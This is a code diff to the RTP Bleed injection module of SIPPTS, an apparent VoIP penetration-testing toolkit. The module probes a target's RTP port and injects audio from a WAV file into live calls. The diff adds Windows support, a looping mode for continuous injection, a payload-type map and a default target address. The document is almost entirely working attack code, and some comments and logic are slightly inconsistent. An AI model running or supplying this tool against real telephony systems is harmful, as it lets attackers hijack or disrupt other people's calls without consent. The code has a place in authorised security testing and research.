@@ -8,33 +8,61 @@ __copyright__ = "Copyright (C) 2015-2024, SIPPTS"
 __email__ = "pepeluxx@gmail.com"
 
 import socket
-import fcntl
 import os
 import sys
 import time
+import platform
 from .lib.color import Color
 from .lib.logos import Logo
 
+# RTP负载类型定义
+RTP_PAYLOAD_TYPES = {
+    "0 PCMU (audio)": 0,
+    "3 GSM (audio)": 3,
+    "4 G723 (audio)": 4,
+    "5 DVI4 (audio)": 5,
+    "6 DVI4 (audio)": 6,
+    "7 LPC (audio)": 7,
+    "8 PCMA (audio)": 8,
+    "9 G722 (audio)": 9,
+    "10 L16 (audio)": 10,
+    "11 L16 (audio)": 11,
+    "12 QCELP (audio)": 12,
+    "13 CN (audio)": 13,
+    "14 MPA (audio)": 14,
+    "15 G728 (audio)": 15,
+    "16 DVI4 (audio)": 16,
+    "17 DVI4 (audio)": 17,
+    "18 G729 (audio)": 18,
+    "25 CELLB (video)": 25,
+    "26 JPEG (video)": 26,
+    "28 nv (video)": 28,
+    "31 H261 (video)": 31,
+    "32 MPV (video)": 32,
+    "33 MP2T (audio/video)": 33,
+    "34 H263 (video)": 34
+}
 
 class RTPBleedInject:
     def __init__(self):
-        self.ip = ""
-        self.port = ""
-        self.payload = "0"
-        self.file = ""
+        self.ip = "192.168.4.200"
+        self.port = "10042"
+        self.payload = "0 PCMU (audio)"  # 修改默认值为完整描述
+        self.file = "test.wav"
+        self.loop = False
 
         self.run = True
 
         self.c = Color()
 
-
     def stop(self):
         print(self.c.WHITE)
         self.run = False
 
-
     def start(self):
         self.port = int(self.port)
+        # 获取负载类型的数值
+        payload_value = RTP_PAYLOAD_TYPES[self.payload]
 
         logo = Logo("rtpbleedinject")
         logo.print()
@@ -43,8 +71,9 @@ class RTPBleedInject:
         print(
             f"{self.c.BWHITE}[✓] Remote port: {self.c.YELLOW}{self.c.YELLOW}{str(self.port)}"
         )
-        print(f"{self.c.BWHITE}[✓] Payload type: {self.c.YELLOW}{str(self.payload)}")
+        print(f"{self.c.BWHITE}[✓] Payload type: {self.c.YELLOW}{self.payload}")
         print(f"{self.c.BWHITE}[✓] WAV file {self.c.YELLOW}{self.file}")
+        print(f"{self.c.BWHITE}[✓] Loop mode: {self.c.YELLOW}{'Enabled' if self.loop else 'Disabled'}")
         print(self.c.WHITE)
 
         print(f"{self.c.YELLOW}[+] Reading WAV file ...{self.c.WHITE}")
@@ -64,11 +93,18 @@ class RTPBleedInject:
         # Create a UDP socket
         try:
             sock = socket.socket(socket.AF_INET, socket.SOCK_DGRAM)
+            
+            # 根据操作系统设置非阻塞模式
+            if platform.system() != 'Windows':
+                import fcntl
+                fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)
+            else:
+                sock.setblocking(False)
+                
         except socket.error:
             print(f"{self.c.RED}Failed to create socket")
             print(self.c.WHITE)
             sys.exit(1)
-        fcntl.fcntl(sock, fcntl.F_SETFL, os.O_NONBLOCK)
 
         host = (str(self.ip), self.port)
         nloop = 0
@@ -79,7 +115,7 @@ class RTPBleedInject:
                 nloop += 1
                 cloop = hex(nloop)[2:]
                 cloop = cloop.zfill(4)
-                cpayload = "%s" % hex(0x80 | self.payload & 0x7F)[2:]
+                cpayload = "%s" % hex(0x80 | payload_value & 0x7F)[2:]
                 # byte[0] = 0x80 => RTP version 2
                 # byte[1] = 0x80+payload => Codec version (https://en.wikipedia.org/wiki/RTP_payload_formats)
                 # byte[2-3] = Sequence number
@@ -90,6 +126,7 @@ class RTPBleedInject:
                     nloop = 1
 
                 # Send data
+                print(f"{self.c.YELLOW}[+] Sending RTP packets now!{self.c.WHITE}")
                 sock.sendto(byte_array, host)
 
                 (msg, addr) = sock.recvfrom(4096)
@@ -117,16 +154,22 @@ class RTPBleedInject:
                     cont = 0
                     hexdata = data.hex()
                     size = 160
+                    SAMPLE_RATE = 8000  # 标准8kHz采样率
+                    SAMPLES_PER_PACKET = size // 1  # 80个采样点
 
                     print(f"{self.c.YELLOW}[+] Injecting RTP audio ...{self.c.WHITE}")
 
-                    while cont - size < total and self.run == True:
+                    while self.run == True:
+                        if not self.run:
+                            print(f"\n{self.c.YELLOW}[!] Stopping RTP injection...{self.c.WHITE}")
+                            break
+
                         packet = hexdata[cont : cont + (size * 2)]
 
                         nseq = int("%s" % seq, base=16) + 1
                         seq = hex(nseq)[2:].zfill(4)
 
-                        ntimestamp = int("%s" % timestamp, base=16) + size
+                        ntimestamp = int("%s" % timestamp, base=16) + SAMPLES_PER_PACKET
                         timestamp = hex(ntimestamp)[2:].zfill(8)
 
                         print(
@@ -144,16 +187,33 @@ class RTPBleedInject:
                         )
                         byte_array = bytearray.fromhex(packet_bytes)
                         # Send data
-                        sock.sendto(byte_array, host)
-                        time.sleep(size / 11000.0)
-
+                        try:
+                            sock.sendto(byte_array, host)
+                            time.sleep(SAMPLES_PER_PACKET / SAMPLE_RATE)
+                        except socket.error as e:
+                            print(f"\n{self.c.RED}[!] Socket error: {e}{self.c.WHITE}")
+                            self.run = False
+                            break
+                        
                         cont += size * 2
+                        
+                        # 如果到达文件末尾且启用了循环模式，则重置计数器继续发送
+                        if cont >= total:
+                            if self.loop:
+                                print(f"\n{self.c.YELLOW}[+] Restarting audio file...{self.c.WHITE}")
+                                cont = 0
+                            else:
+                                break
+
+                    if not self.run:
+                        break
+
             except KeyboardInterrupt:
-                print(f"{self.c.YELLOW}You pressed Ctrl+C!")
-                print(self.c.WHITE)
+                print(f"\n{self.c.YELLOW}[!] Keyboard interrupt received{self.c.WHITE}")
                 self.run = False
-            except:
+            except Exception as e:
+                print(f"{self.c.YELLOW}[+] Exception: {e}{self.c.WHITE}")
                 pass
 
-        print(self.c.WHITE)
+        print(f"\n{self.c.YELLOW}[+] Closing connection...{self.c.WHITE}")
         sock.close()
